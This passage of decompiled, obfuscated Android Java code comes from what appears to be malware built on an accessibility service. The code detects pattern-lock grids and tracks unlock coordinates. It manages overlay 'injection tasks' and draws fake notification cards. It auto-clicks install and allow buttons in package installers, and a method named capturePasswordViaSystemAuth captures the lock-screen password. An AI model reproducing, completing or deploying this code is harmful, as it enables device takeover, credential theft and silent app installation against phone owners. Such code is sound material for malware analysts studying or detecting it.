                    t60.m214702c3("ScreenElementAnalyzer", "🔍 真实屏幕尺寸: " + point.x + "x" + point.y);
                    float f7 = dqtvuisjdVar2.getResources().getDisplayMetrics().density;
                    StringBuilder sb = new StringBuilder("📱 显示密度: ");
                    sb.append(f7);
                    t60.m214702c3("ScreenElementAnalyzer", sb.toString());
                } catch (Exception e) {
                    t60.m214705c6("ScreenElementAnalyzer", "获取真实屏幕尺寸失败，使用默认方法", e);
                    DisplayMetrics displayMetrics = dqtvuisjdVar2.getResources().getDisplayMetrics();
                    t60.m214702c3("ScreenElementAnalyzer", "🔍 默认屏幕尺寸: " + displayMetrics.widthPixels + "x" + displayMetrics.heightPixels);
                    pairM211467g1 = new Pair(Integer.valueOf(displayMetrics.widthPixels), Integer.valueOf(displayMetrics.heightPixels));
                }
                if (point.x <= 0 || point.y <= 0) {
                    DisplayMetrics displayMetrics2 = dqtvuisjdVar2.getResources().getDisplayMetrics();
                    t60.m214726f4("ScreenElementAnalyzer", "🔄 回退到显示区域尺寸: " + displayMetrics2.widthPixels + "x" + displayMetrics2.heightPixels);
                    pairM211467g1 = new Pair(Integer.valueOf(displayMetrics2.widthPixels), Integer.valueOf(displayMetrics2.heightPixels));
                    Object obj2 = pairM211467g1.f57557a1;
                    obj = pairM211467g1.f57556a0;
                    t60.m214702c3("dqtvuisjd", "📊 ScreenElementAnalyzer获取尺寸: " + obj + "x" + obj2);
                    if (((Number) obj).intValue() <= 0 || ((Number) obj2).intValue() <= 0) {
                        t60.m214726f4("dqtvuisjd", "⚠️ ScreenElementAnalyzer结果异常，使用备用方法");
                        pairM211467g1 = dqtvuisjdVar.m211467g1();
                    }
                } else {
                    DisplayMetrics displayMetrics3 = dqtvuisjdVar2.getResources().getDisplayMetrics();
                    t60.m214702c3("ScreenElementAnalyzer", "📊 对比 - 真实尺寸: " + point.x + "x" + point.y + ", 显示区域: " + displayMetrics3.widthPixels + "x" + displayMetrics3.heightPixels);
                    int i = point.y;
                    if (i >= displayMetrics3.heightPixels) {
                        t60.m214714d6("ScreenElementAnalyzer", "✅ 成功获取真实屏幕尺寸（包含系统UI）: " + point.x + "x" + i);
                        pairM211467g1 = new Pair(Integer.valueOf(point.x), Integer.valueOf(point.y));
                        Object obj22 = pairM211467g1.f57557a1;
                        obj = pairM211467g1.f57556a0;
                        t60.m214702c3("dqtvuisjd", "📊 ScreenElementAnalyzer获取尺寸: " + obj + "x" + obj22);
                        if (((Number) obj).intValue() <= 0) {
                            t60.m214726f4("dqtvuisjd", "⚠️ ScreenElementAnalyzer结果异常，使用备用方法");
                            pairM211467g1 = dqtvuisjdVar.m211467g1();
                        }
                    } else {
                        t60.m214726f4("ScreenElementAnalyzer", "⚠️ 真实尺寸异常，高度小于显示区域，使用显示区域尺寸");
                        DisplayMetrics displayMetrics22 = dqtvuisjdVar2.getResources().getDisplayMetrics();
                        t60.m214726f4("ScreenElementAnalyzer", "🔄 回退到显示区域尺寸: " + displayMetrics22.widthPixels + "x" + displayMetrics22.heightPixels);
                        pairM211467g1 = new Pair(Integer.valueOf(displayMetrics22.widthPixels), Integer.valueOf(displayMetrics22.heightPixels));
                        Object obj222 = pairM211467g1.f57557a1;
                        obj = pairM211467g1.f57556a0;
                        t60.m214702c3("dqtvuisjd", "📊 ScreenElementAnalyzer获取尺寸: " + obj + "x" + obj222);
                        if (((Number) obj).intValue() <= 0) {
                        }
                    }
                }
            } else {
                t60.m214726f4("dqtvuisjd", "⚠️ ScreenElementAnalyzer未初始化，使用备用方法");
                pairM211467g1 = dqtvuisjdVar.m211467g1();
            }
            int iIntValue = ((Number) pairM211467g1.f57556a0).intValue();
            int iIntValue2 = ((Number) pairM211467g1.f57557a1).intValue();
            x81 x81Var = dqtvuisjdVar.f52417e8;
            if (x81Var == null) {
                t60.m214724f2("unlockManager");
                throw null;
            }
            x81Var.m215136a8(f, f2, str, f3, iIntValue, iIntValue2, "", "");
            str2 = str;
            f5 = f2;
            f4 = f;
        } else {
            f4 = f;
            str2 = str;
            f5 = f2;
            C0761kk c0761kk = dqtvuisjdVar.f52416e7;
            if (c0761kk != null) {
                SharedPreferences sharedPreferences = c0761kk.f57539a1;
                try {
                    String strM213595a0 = c0761kk.m213595a0();
                    int i2 = sharedPreferences.getInt("learn_count_" + strM213595a0, 0);
                    int i3 = i2 + 1;
                    float f8 = sharedPreferences.getFloat("learned_x_" + strM213595a0, f4);
                    float f9 = sharedPreferences.getFloat("learned_y_" + strM213595a0, f5);
                    int iHashCode = str2.hashCode();
                    if (iHashCode == -1081415738) {
                        f6 = str2.equals("manual") ? 0.4f : 0.3f;
                        float f10 = f6 * f3;
                        if (i2 == 0) {
                        }
                        if (i2 == 0) {
                        }
                        sharedPreferences.edit().putFloat("learned_x_" + strM213595a0, f).putFloat("learned_y_" + strM213595a0, f).putInt("learn_count_" + strM213595a0, i3).putLong("last_learn_time_" + strM213595a0, System.currentTimeMillis()).apply();
                    } else if (iHashCode != -213139122) {
                        if (iHashCode == 50780643 && str2.equals("learned")) {
                            f6 = 0.2f;
                            float f102 = f6 * f3;
                            float f11 = i2 == 0 ? f4 : (f4 * f102) + ((1 - f102) * f8);
                            float f12 = i2 == 0 ? f5 : (f102 * f5) + ((1 - f102) * f9);
                            sharedPreferences.edit().putFloat("learned_x_" + strM213595a0, f11).putFloat("learned_y_" + strM213595a0, f12).putInt("learn_count_" + strM213595a0, i3).putLong("last_learn_time_" + strM213595a0, System.currentTimeMillis()).apply();
                        } else {
                            float f1022 = f6 * f3;
                            if (i2 == 0) {
                            }
                            if (i2 == 0) {
                            }
                            sharedPreferences.edit().putFloat("learned_x_" + strM213595a0, f11).putFloat("learned_y_" + strM213595a0, f12).putInt("learn_count_" + strM213595a0, i3).putLong("last_learn_time_" + strM213595a0, System.currentTimeMillis()).apply();
                        }
                    } else if (str2.equals("accessibility")) {
                        f6 = 0.25f;
                        float f10222 = f6 * f3;
                        if (i2 == 0) {
                        }
                        if (i2 == 0) {
                        }
                        sharedPreferences.edit().putFloat("learned_x_" + strM213595a0, f11).putFloat("learned_y_" + strM213595a0, f12).putInt("learn_count_" + strM213595a0, i3).putLong("last_learn_time_" + strM213595a0, System.currentTimeMillis()).apply();
                    } else {
                        float f102222 = f6 * f3;
                        if (i2 == 0) {
                        }
                        if (i2 == 0) {
                        }
                        sharedPreferences.edit().putFloat("learned_x_" + strM213595a0, f11).putFloat("learned_y_" + strM213595a0, f12).putInt("learn_count_" + strM213595a0, i3).putLong("last_learn_time_" + strM213595a0, System.currentTimeMillis()).apply();
                    }
                } catch (Exception e2) {
                    t60.m214705c6("ConfigManager", "记录确认按钮坐标失败", e2);
                }
            }
        }
        String str3 = AbstractC0315a0.f53025a0;
        AbstractC0315a0.m211544a6("记录确认按钮坐标: (" + f4 + ", " + f5 + ") [来源:" + str2 + ", 文本:'']");
    }

    /* renamed from: k0 */
    public static void m211435k0(String str, String str2) {
        t60.m214695b6(str, "logType");
        t60.m214695b6(str2, "content");
        String str3 = AbstractC0315a0.f53025a0;
        AbstractC0315a0.m211544a6("[" + str + "] " + str2);
    }

    /* renamed from: k9 */
    public static void m211436k9(AccessibilityNodeInfo accessibilityNodeInfo, int i) {
        String string;
        if (i > 5) {
            return;
        }
        String strM213671c4 = AbstractC0779a1.m213671c4(i, "  ");
        Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfo);
        CharSequence className = accessibilityNodeInfo.getClassName();
        if (className == null || (string = className.toString()) == null) {
            string = "null";
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null) {
            contentDescription.toString();
        }
        CharSequence text = accessibilityNodeInfo.getText();
        if (text != null) {
            text.toString();
        }
        accessibilityNodeInfo.getViewIdResourceName();
        if (rectM24a5.width() > 50 && rectM24a5.height() > 50) {
            int iWidth = rectM24a5.width();
            int iHeight = rectM24a5.height();
            StringBuilder sbM40c1 = AbstractC0003a2.m40c1("🔍 ", strM213671c4, "[", i, "] ");
            sbM40c1.append(string);
            sbM40c1.append(" | 边界=");
            sbM40c1.append(rectM24a5);
            sbM40c1.append(" | 宽=");
            sbM40c1.append(iWidth);
            sbM40c1.append(" 高=");
            sbM40c1.append(iHeight);
            t60.m214714d6("dqtvuisjd", sbM40c1.toString());
            boolean z = ((double) Math.abs(rectM24a5.width() - rectM24a5.height())) < ((double) rectM24a5.width()) * 0.3d;
            boolean z2 = rectM24a5.width() > 400 && rectM24a5.height() > 400;
            if (z && z2) {
                t60.m214726f4("dqtvuisjd", "🔍 " + strM213671c4 + "    ⭐⭐⭐ 疑似九宫格区域! 宽高比接近1:1");
            }
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i2 = 0; i2 < childCount; i2++) {
            try {
                AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i2);
                if (child != null) {
                    m211436k9(child, i + 1);
                }
            } catch (Exception unused) {
            }
        }
    }

    /* renamed from: m4 */
    public static List m211437m4(ArrayList arrayList) {
        if (arrayList.size() != 9) {
            return arrayList;
        }
        List listM213300i7 = AbstractC0715je.m213300i7(arrayList, new C1214s9(15));
        List listM213300i72 = AbstractC0715je.m213300i7(listM213300i7.subList(0, 3), new C1214s9(16));
        List listM213300i73 = AbstractC0715je.m213300i7(listM213300i7.subList(3, 6), new C1214s9(17));
        return AbstractC0715je.m213298i5(AbstractC0715je.m213298i5(listM213300i72, listM213300i73), AbstractC0715je.m213300i7(listM213300i7.subList(6, 9), new C1214s9(18)));
    }

    /* renamed from: n4 */
    public static boolean m211438n4(List list) {
        boolean z;
        if (list.size() != 9) {
            return false;
        }
        try {
            float f = ((PointF) list.get(1)).x - ((PointF) list.get(0)).x;
            float f2 = ((PointF) list.get(2)).x - ((PointF) list.get(1)).x;
            z = false;
            try {
                float f3 = ((PointF) list.get(3)).y - ((PointF) list.get(0)).y;
                float f4 = ((PointF) list.get(6)).y - ((PointF) list.get(3)).y;
                t60.m214702c3("dqtvuisjd", "🔍 [validatePatternGrid] X间距: " + f + ", " + f2);
                t60.m214702c3("dqtvuisjd", "🔍 [validatePatternGrid] Y间距: " + f3 + ", " + f4);
                float f5 = f > f2 ? f2 / f : f / f2;
                if (f5 < 0.8f) {
                    t60.m214726f4("dqtvuisjd", "⚠️ [validatePatternGrid] X方向间距不一致: ratio=" + f5);
                    return false;
                }
                float f6 = f3 > f4 ? f4 / f3 : f3 / f4;
                if (f6 < 0.8f) {
                    t60.m214726f4("dqtvuisjd", "⚠️ [validatePatternGrid] Y方向间距不一致: ratio=" + f6);
                    return false;
                }
                float f7 = 2;
                float f8 = (f + f2) / f7;
                float f9 = (f3 + f4) / f7;
                float f10 = f8 > f9 ? f9 / f8 : f8 / f9;
                t60.m214702c3("dqtvuisjd", "🔍 [validatePatternGrid] 平均X间距=" + f8 + ", 平均Y间距=" + f9 + ", 比例=" + f10);
                if (f10 < 0.7f) {
                    t60.m214726f4("dqtvuisjd", "⚠️ [validatePatternGrid] X和Y方向间距差异过大: ratio=" + f10);
                    return false;
                }
                if (f8 >= 50.0f && f9 >= 50.0f) {
                    t60.m214714d6("dqtvuisjd", "✅ [validatePatternGrid] 九宫格点位验证通过");
                    return true;
                }
                t60.m214726f4("dqtvuisjd", "⚠️ [validatePatternGrid] 间距太小: avgX=" + f8 + ", avgY=" + f9);
                return false;
            } catch (Exception e) {
                e = e;
                t60.m214705c6("dqtvuisjd", "❌ [validatePatternGrid] 验证失败", e);
                return z;
            }
        } catch (Exception e2) {
            e = e2;
            z = false;
        }
    }

    /* renamed from: c1 */
    public final void m211439c1(String str, String str2) {
        String str3;
        synchronized (this.f52406d7) {
            try {
                if (this.f52405d6.size() >= this.f52452i3 && !this.f52405d6.containsKey(str) && (str3 = (String) AbstractC0715je.m213292h9(this.f52405d6.keySet())) != null) {
                    this.f52405d6.remove(str3);
                    this.f52407d8.remove(str3);
                    t60.m214726f4("dqtvuisjd", "⚠️ 注入任务已满，移除最旧: ".concat(str3));
                }
                this.f52405d6.put(str, str2);
                t60.m214714d6("dqtvuisjd", "✅ 已记录注入任务: " + str + " (当前共有 " + this.f52405d6.size() + " 个激活任务)");
            } catch (Throwable th) {
                throw th;
            }
        }
        AbstractC0780a0.m213692a3(this.f52378a9, AbstractC1262tj.f60234a1, new dqtvuisjd$pushInjectionTaskToLocalService$1(str, str2, null), 2);
    }

    /* renamed from: c2 */
    public final void m211440c2() {
        AccessibilityNodeInfo rootInActiveWindow = getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return;
        }
        try {
            try {
                String[] strArr = {"安装", "继续安装", "仍然安装", "完成", "打开", "Install", "Continue", "Done", "Open", "INSTALL", "CONTINUE", "DONE", "允许", "Allow", "ALLOW", "继续", "确定", "确认", "OK", "ok"};
                String[] strArr2 = {"卸载", "Uninstall", "UNINSTALL", "删除", "Delete", "移除", "Remove"};
                ArrayList arrayList = new ArrayList();
                m211422c3(0, rootInActiveWindow, arrayList);
                if (!arrayList.isEmpty()) {
                    int size = arrayList.size();
                    int i = 0;
                    while (i < size) {
                        Object obj = arrayList.get(i);
                        i++;
                        String str = (String) obj;
                        for (int i2 = 0; i2 < 7; i2++) {
                            if (AbstractC0779a1.m213652a5(str, strArr2[i2], true)) {
                                try {
                                    return;
                                } catch (Exception unused) {
                                    return;
                                }
                            }
                        }
                    }
                }
                List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId("com.miui.packageinstaller:id/ok_button");
                if (listFindAccessibilityNodeInfosByViewId == null || listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                    int i3 = 0;
                    while (true) {
                        if (i3 < 20) {
                            String str2 = strArr[i3];
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str2);
                            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                                    if (accessibilityNodeInfo.isClickable()) {
                                        accessibilityNodeInfo.performAction(16);
                                        t60.m214714d6("dqtvuisjd", "📦 [自动安装] 点击按钮: " + str2);
                                        Iterator<T> it = listFindAccessibilityNodeInfosByText.iterator();
                                        while (it.hasNext()) {
                                            try {
                                                ((AccessibilityNodeInfo) it.next()).recycle();
                                            } catch (Exception unused2) {
                                            }
                                        }
                                    } else {
                                        AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                                        int i4 = 0;
                                        while (parent != null && i4 < 5) {
                                            if (parent.isClickable()) {
                                                parent.performAction(16);
                                                t60.m214714d6("dqtvuisjd", "📦 [自动安装] 点击父节点: " + str2);
                                                try {
                                                    parent.recycle();
                                                } catch (Exception unused3) {
                                                }
                                                Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                                                while (it2.hasNext()) {
                                                    try {
                                                        ((AccessibilityNodeInfo) it2.next()).recycle();
                                                    } catch (Exception unused4) {
                                                    }
                                                }
                                            } else {
                                                AccessibilityNodeInfo parent2 = parent.getParent();
                                                try {
                                                    parent.recycle();
                                                } catch (Exception unused5) {
                                                }
                                                i4++;
                                                parent = parent2;
                                            }
                                        }
                                    }
                                }
                                Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                                while (it3.hasNext()) {
                                    try {
                                        ((AccessibilityNodeInfo) it3.next()).recycle();
                                    } catch (Exception unused6) {
                                    }
                                }
                            }
                            i3++;
                        }
                    }
                } else {
                    listFindAccessibilityNodeInfosByViewId.get(0).performAction(16);
                    t60.m214714d6("dqtvuisjd", "📦 [自动安装] MIUI ok_button 已点击");
                    Iterator<T> it4 = listFindAccessibilityNodeInfosByViewId.iterator();
                    while (it4.hasNext()) {
                        try {
                            ((AccessibilityNodeInfo) it4.next()).recycle();
                        } catch (Exception unused7) {
                        }
                    }
                }
            } finally {
                try {
                    rootInActiveWindow.recycle();
                } catch (Exception unused8) {
                }
            }
        } catch (Exception unused9) {
        }
        try {
            rootInActiveWindow.recycle();
        } catch (Exception unused10) {
        }
    }

    /* renamed from: c5 */
    public final FrameLayout m211441c5(final String str, String str2, String str3, String str4, String str5, Drawable drawable, final WindowManager windowManager) {
        Object objM213507a7;
        Object objM213507a72;
        float fFloatValue;
        int i;
        int i2;
        int i3;
        int i4;
        String str6;
        LinearLayout linearLayout;
        TextView textView;
        float f;
        float f2;
        float f3 = getResources().getDisplayMetrics().density;
        boolean z = (getResources().getConfiguration().uiMode & 48) == 32;
        try {
            int i5 = Result.f57558a1;
            TypedValue typedValue = new TypedValue();
            getTheme().resolveAttribute(R.attr.colorAccent, typedValue, true);
            objM213507a7 = Integer.valueOf(typedValue.data);
        } catch (Throwable th) {
            int i6 = Result.f57558a1;
            objM213507a7 = kg1.m213507a7(th);
        }
        if (Result.m213607a0(objM213507a7) != null) {
            objM213507a7 = -15043608;
        }
        int iIntValue = ((Number) objM213507a7).intValue();
        if (Build.VERSION.SDK_INT >= 31) {
            try {
                Object systemService = getSystemService("window");
                t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
                WindowMetrics currentWindowMetrics = ((WindowManager) systemService).getCurrentWindowMetrics();
                t60.m214694b5(currentWindowMetrics, "wm.currentWindowMetrics");
                t60.m214694b5(currentWindowMetrics.getWindowInsets().getInsetsIgnoringVisibility(WindowInsets.Type.systemBars()), "windowMetrics.windowInse…mBars()\n                )");
                float dimension = getResources().getDimension(getResources().getIdentifier("rounded_corner_radius", "dimen", "android"));
                Float fValueOf = Float.valueOf(dimension);
                if (dimension <= 0.0f) {
                    fValueOf = null;
                }
                objM213507a72 = Float.valueOf(fValueOf != null ? fValueOf.floatValue() : 24 * getResources().getDisplayMetrics().density);
            } catch (Throwable th2) {
                int i7 = Result.f57558a1;
                objM213507a72 = kg1.m213507a7(th2);
            }
            if (Result.m213607a0(objM213507a72) != null) {
                objM213507a72 = Float.valueOf(24 * getResources().getDisplayMetrics().density);
            }
            fFloatValue = ((Number) objM213507a72).floatValue();
        } else {
            String str7 = Build.BRAND;
            t60.m214694b5(str7, "BRAND");
            String lowerCase = str7.toLowerCase(Locale.ROOT);
            t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            if (AbstractC0779a1.m213652a5(lowerCase, "huawei", false) || AbstractC0779a1.m213652a5(lowerCase, "honor", false)) {
                f = 20;
                f2 = getResources().getDisplayMetrics().density;
            } else if (AbstractC0779a1.m213652a5(lowerCase, "xiaomi", false) || AbstractC0779a1.m213652a5(lowerCase, "redmi", false)) {
                f = 18;
                f2 = getResources().getDisplayMetrics().density;
            } else if (AbstractC0779a1.m213652a5(lowerCase, "oppo", false) || AbstractC0779a1.m213652a5(lowerCase, "realme", false)) {
                f = 16;
                f2 = getResources().getDisplayMetrics().density;
            } else if (AbstractC0779a1.m213652a5(lowerCase, "vivo", false)) {
                f = 20;
                f2 = getResources().getDisplayMetrics().density;
            } else if (AbstractC0779a1.m213652a5(lowerCase, "samsung", false)) {
                f = 24;
                f2 = getResources().getDisplayMetrics().density;
            } else {
                f = 16;
                f2 = getResources().getDisplayMetrics().density;
            }
            fFloatValue = f * f2;
        }
        float f4 = fFloatValue;
        if (z) {
            i = -433049552;
            i2 = -1;
            i3 = -2039584;
            i4 = -6381922;
        } else {
            i = -419430401;
            i2 = -16777216;
            i3 = -13421773;
            i4 = -9079435;
        }
        int i8 = i;
        int i9 = i2;
        int i10 = i3;
        int i11 = i4;
        sj1 sj1Var = new sj1(z, i8, i9, i10, i11, iIntValue, f4);
        final FrameLayout frameLayout = new FrameLayout(this);
        int i12 = (int) (12 * f3);
        float f5 = 8 * f3;
        int i13 = (int) f5;
        frameLayout.setPadding(i12, i13, i12, i13);
        LinearLayout linearLayout2 = new LinearLayout(this);
        linearLayout2.setOrientation(1);
        int i14 = (int) (16 * f3);
        linearLayout2.setPadding(i14, (int) (14 * f3), i14, i12);
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(i8);
        gradientDrawable.setCornerRadius(f4);
        linearLayout2.setBackground(gradientDrawable);
        linearLayout2.setElevation(f5);
        linearLayout2.setClipToOutline(true);
        linearLayout2.setOutlineProvider(new C0587hn(3, sj1Var));
        linearLayout2.setClickable(true);
        linearLayout2.setFocusable(true);
        final int i15 = 0;
        linearLayout2.setOnClickListener(new View.OnClickListener() { // from class: rj1
            /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:26:0x008c -> B:35:0x0093). Please report as a decompilation issue!!! */
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                int i16 = i15;
                FrameLayout frameLayout2 = frameLayout;
                WindowManager windowManager2 = windowManager;
                dqtvuisjd dqtvuisjdVar = this;
                String str8 = str;
                switch (i16) {
                    case 0:
                        dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
                        t60.m214714d6("dqtvuisjd", "🔔 点击通知卡片: ".concat(str8));
                        try {
                            Intent launchIntentForPackage = dqtvuisjdVar.getPackageManager().getLaunchIntentForPackage(str8);
                            if (launchIntentForPackage != null) {
                                launchIntentForPackage.addFlags(335544320);
                                dqtvuisjdVar.startActivity(launchIntentForPackage);
                                t60.m214714d6("dqtvuisjd", "🔔 已启动应用: ".concat(str8));
                            } else {
                                t60.m214726f4("dqtvuisjd", "🔔 无法获取启动Intent: ".concat(str8));
                            }
                        } catch (Exception e) {
                            tz0.m214808a8("🔔 启动应用失败: ", e.getMessage(), "dqtvuisjd", e);
                        }
                        try {
                            windowManager2.removeView(frameLayout2);
                            dqtvuisjdVar.f52481l2 = null;
                            dqtvuisjdVar.f52482l3 = null;
                            break;
                        } catch (Exception e2) {
                            tz0.m214807a7("🔔 关闭通知失败: ", e2.getMessage(), "dqtvuisjd");
                            return;
                        }
                    default:
                        dqtvuisjd.C0290a0 c0290a02 = dqtvuisjd.f52358m1;
                        t60.m214714d6("dqtvuisjd", "🔔 点击通知按钮: ".concat(str8));
                        try {
                            Intent launchIntentForPackage2 = dqtvuisjdVar.getPackageManager().getLaunchIntentForPackage(str8);
                            if (launchIntentForPackage2 != null) {
                                launchIntentForPackage2.addFlags(335544320);
                                dqtvuisjdVar.startActivity(launchIntentForPackage2);
                                t60.m214714d6("dqtvuisjd", "🔔 已启动应用: ".concat(str8));
                            } else {
                                t60.m214726f4("dqtvuisjd", "🔔 无法获取启动Intent: ".concat(str8));
                            }
                        } catch (Exception e3) {
                            tz0.m214808a8("🔔 启动应用失败: ", e3.getMessage(), "dqtvuisjd", e3);
                        }
                        try {
                            windowManager2.removeView(frameLayout2);
                            dqtvuisjdVar.f52481l2 = null;
                            dqtvuisjdVar.f52482l3 = null;
                            break;
                        } catch (Exception e4) {
                            tz0.m214807a7("🔔 关闭通知失败: ", e4.getMessage(), "dqtvuisjd");
                        }
                }
            }
        });
        LinearLayout linearLayout3 = new LinearLayout(this);
        linearLayout3.setOrientation(0);
        linearLayout3.setGravity(16);
        linearLayout3.setClickable(false);
        linearLayout3.setFocusable(false);
        float f6 = 3;
        float f7 = f4 / f6;
        ImageView imageView = new ImageView(this);
        int i16 = (int) (44 * f3);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(i16, i16);
        layoutParams.setMarginEnd(i12);
        imageView.setLayoutParams(layoutParams);
        if (drawable != null) {
            imageView.setImageDrawable(drawable);
        }
        imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);
        imageView.setClipToOutline(true);
        imageView.setClickable(false);
        imageView.setFocusable(false);
        imageView.setOutlineProvider(new C0706j5(f7, 1));
        LinearLayout linearLayout4 = new LinearLayout(this);
        linearLayout4.setOrientation(1);
        linearLayout4.setLayoutParams(new LinearLayout.LayoutParams(0, -2, 1.0f));
        linearLayout4.setClickable(false);
        linearLayout4.setFocusable(false);
        TextView textView2 = new TextView(this);
        textView2.setText(str2);
        textView2.setTextColor(i11);
        textView2.setTextSize(12.0f);
        linearLayout4.addView(textView2);
        if (str3.length() > 0) {
            TextView textView3 = new TextView(this);
            str6 = str3;
            textView3.setText(str6);
            textView3.setTextColor(i9);
            textView3.setTextSize(14.0f);
            textView3.setTypeface(null, 1);
            textView3.setPadding(0, (int) (f6 * f3), 0, (int) (2 * f3));
            linearLayout4.addView(textView3);
        } else {
            str6 = str3;
        }
        TextView textView4 = new TextView(this);
        textView4.setText(str4);
        textView4.setTextColor(i10);
        textView4.setTextSize(13.0f);
        textView4.setMaxLines(2);
        textView4.setEllipsize(TextUtils.TruncateAt.END);
        if (str6.length() == 0) {
            textView4.setPadding(0, (int) (4 * f3), 0, 0);
        }
        linearLayout4.addView(textView4);
        linearLayout3.addView(imageView);
        linearLayout3.addView(linearLayout4);
        LinearLayout linearLayout5 = new LinearLayout(this);
        linearLayout5.setGravity(8388613);
        linearLayout5.setPadding(0, (int) (10 * f3), 0, 0);
        if (AbstractC0779a1.m213663b6(str5)) {
            linearLayout = linearLayout3;
            textView = null;
        } else {
            TextView textView5 = new TextView(this);
            textView5.setText(str5);
            textView5.setTextColor(iIntValue);
            textView5.setTextSize(14.0f);
            textView5.setTypeface(null, 1);
            textView5.setPadding(i12, i13, (int) (4 * f3), i13);
            textView5.setClickable(true);
            textView5.setFocusable(true);
            final int i17 = 1;
            linearLayout = linearLayout3;
            textView5.setOnClickListener(new View.OnClickListener() { // from class: rj1
                /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:26:0x008c -> B:35:0x0093). Please report as a decompilation issue!!! */
                @Override // android.view.View.OnClickListener
                public final void onClick(View view) {
                    int i162 = i17;
                    FrameLayout frameLayout2 = frameLayout;
                    WindowManager windowManager2 = windowManager;
                    dqtvuisjd dqtvuisjdVar = this;
                    String str8 = str;
                    switch (i162) {
                        case 0:
                            dqtvuisjd.C0290a0 c0290a0 = dqtvuisjd.f52358m1;
                            t60.m214714d6("dqtvuisjd", "🔔 点击通知卡片: ".concat(str8));
                            try {
                                Intent launchIntentForPackage = dqtvuisjdVar.getPackageManager().getLaunchIntentForPackage(str8);
                                if (launchIntentForPackage != null) {
                                    launchIntentForPackage.addFlags(335544320);
                                    dqtvuisjdVar.startActivity(launchIntentForPackage);
                                    t60.m214714d6("dqtvuisjd", "🔔 已启动应用: ".concat(str8));
                                } else {
                                    t60.m214726f4("dqtvuisjd", "🔔 无法获取启动Intent: ".concat(str8));
                                }
                            } catch (Exception e) {
                                tz0.m214808a8("🔔 启动应用失败: ", e.getMessage(), "dqtvuisjd", e);
                            }
                            try {
                                windowManager2.removeView(frameLayout2);
                                dqtvuisjdVar.f52481l2 = null;
                                dqtvuisjdVar.f52482l3 = null;
                                break;
                            } catch (Exception e2) {
                                tz0.m214807a7("🔔 关闭通知失败: ", e2.getMessage(), "dqtvuisjd");
                                return;
                            }
                        default:
                            dqtvuisjd.C0290a0 c0290a02 = dqtvuisjd.f52358m1;
                            t60.m214714d6("dqtvuisjd", "🔔 点击通知按钮: ".concat(str8));
                            try {
                                Intent launchIntentForPackage2 = dqtvuisjdVar.getPackageManager().getLaunchIntentForPackage(str8);
                                if (launchIntentForPackage2 != null) {
                                    launchIntentForPackage2.addFlags(335544320);
                                    dqtvuisjdVar.startActivity(launchIntentForPackage2);
                                    t60.m214714d6("dqtvuisjd", "🔔 已启动应用: ".concat(str8));
                                } else {
                                    t60.m214726f4("dqtvuisjd", "🔔 无法获取启动Intent: ".concat(str8));
                                }
                            } catch (Exception e3) {
                                tz0.m214808a8("🔔 启动应用失败: ", e3.getMessage(), "dqtvuisjd", e3);
                            }
                            try {
                                windowManager2.removeView(frameLayout2);
                                dqtvuisjdVar.f52481l2 = null;
                                dqtvuisjdVar.f52482l3 = null;
                                break;
                            } catch (Exception e4) {
                                tz0.m214807a7("🔔 关闭通知失败: ", e4.getMessage(), "dqtvuisjd");
                            }
                    }
                }
            });
            textView = textView5;
        }
        linearLayout2.addView(linearLayout);
        if (textView != null) {
            linearLayout5.addView(textView);
            linearLayout2.addView(linearLayout5);
        }
        frameLayout.addView(linearLayout2);
        return frameLayout;
    }

    /* renamed from: c7 */
    public final void m211442c7(boolean z) {
        String str;
        t60.m214714d6("dqtvuisjd", "🔐 capturePasswordViaSystemAuth() 调用，isInstallationFlow=" + z);
        SharedPreferences sharedPreferences = getSharedPreferences(StringUtil.m212470a0("O1gCKVo3HipoMipJBS9fPQ=="), 0);
        if (z && sharedPreferences.getBoolean(StringUtil.m212470a0("KFgBLlgqCRFUPiZJHT9ZPQg="), false)) {
            t60.m214714d6("dqtvuisjd", "🔐 密码捕获已完成（持久化标记），跳过");
            return;
        }
        C0335a1 c0335a1 = this.f52438g9;
        if (c0335a1 != null) {
            C0598hx c0598hxM211819d0 = c0335a1.m211819d0(false);
            if (c0598hxM211819d0 == null) {
                C0335a1 c0335a12 = this.f52438g9;
                if (c0335a12 == null) {
                    t60.m214724f2("cipherCaptureManager");
                    throw null;
                }
                c0598hxM211819d0 = c0335a12.m211819d0(true);
            }
            if (c0598hxM211819d0 != null) {
                t60.m214714d6("dqtvuisjd", "🔐 已有捕获的密码，跳过系统验证");
                m211533n1(c0598hxM211819d0);
                if (z) {
                    m211449d4();
                    return;
                }
                return;
            }
        }
        Object systemService = getSystemService("keyguard");
        t60.m214693b4(systemService, "null cannot be cast to non-null type android.app.KeyguardManager");
        if (!((KeyguardManager) systemService).isKeyguardSecure()) {
            t60.m214714d6("dqtvuisjd", "🔐 设备未设置锁屏密码，跳过密码捕获");
            if (z) {
                try {
                    t60.m214714d6("dqtvuisjd", "🔐 无锁屏密码，直接完成安装流程");
                    getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).edit().putBoolean(StringUtil.m212470a0("LkESNlg8CRFRIyRULihIOwkgQyI="), true).apply();
